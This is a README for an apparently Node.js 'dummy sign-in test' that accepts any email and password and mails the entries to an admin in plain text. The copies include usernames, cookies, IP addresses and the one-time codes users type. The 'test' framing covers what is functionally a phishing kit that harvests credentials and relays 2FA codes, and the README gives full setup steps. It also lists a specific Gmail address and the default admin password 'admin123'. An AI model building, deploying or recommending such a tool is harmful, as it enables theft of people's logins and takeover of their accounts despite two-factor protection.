# Dummy Sign-In Test (with real random OTP via Nodemailer)

Multi-step dummy authentication that generates **random 6-digit OTPs** and sends them to the user’s email using **Nodemailer + Gmail SMTP**.

## Features
- Email + Password (any value accepted) → immediately emailed to admin + OTP 1 generated & sent to user
- Username (any value) → emailed to admin
- OTP 1 (must match the one sent to user)
- OTP 2 (must match the one sent to user)
- Admin receives every step in plain text (including Cookies, IP, Timestamp and the OTPs)
- Password field has 👁️ show/hide toggle
- Only the admin has a real password

## Setup (required)

### 1. Create a Google App Password
1. Go to your Google Account → Security
2. Enable **2-Step Verification** (if not already)
3. Search for **App passwords**
4. Create a new App Password for “Mail”
5. Copy the 16-character password

### 2. Configure environment variables
```bash
cp .env.example .env
```

Edit `.env`:
```env
GMAIL_USER=blessedresult6@gmail.com
GMAIL_APP_PASSWORD=your_16_char_app_password_here
ADMIN_PASSWORD=admin123
PORT=3000
```

### 3. Install & run
```bash
npm install
npm start
```

Open http://localhost:3000

- User flow: http://localhost:3000/
- Admin portal: http://localhost:3000/admin.html

**Admin login**
- Email: `blessedresult6@gmail.com`
- Password: `admin123` (or whatever you set in `.env`)

## Important
- Never commit the real `.env` file (it is already in `.gitignore`)
- The OTPs are randomly generated on the server and sent to the email the user typed
- Admin still gets full plain-text copies of everything

Repo: https://github.com/Dennisbed1234/dummy-signin-test
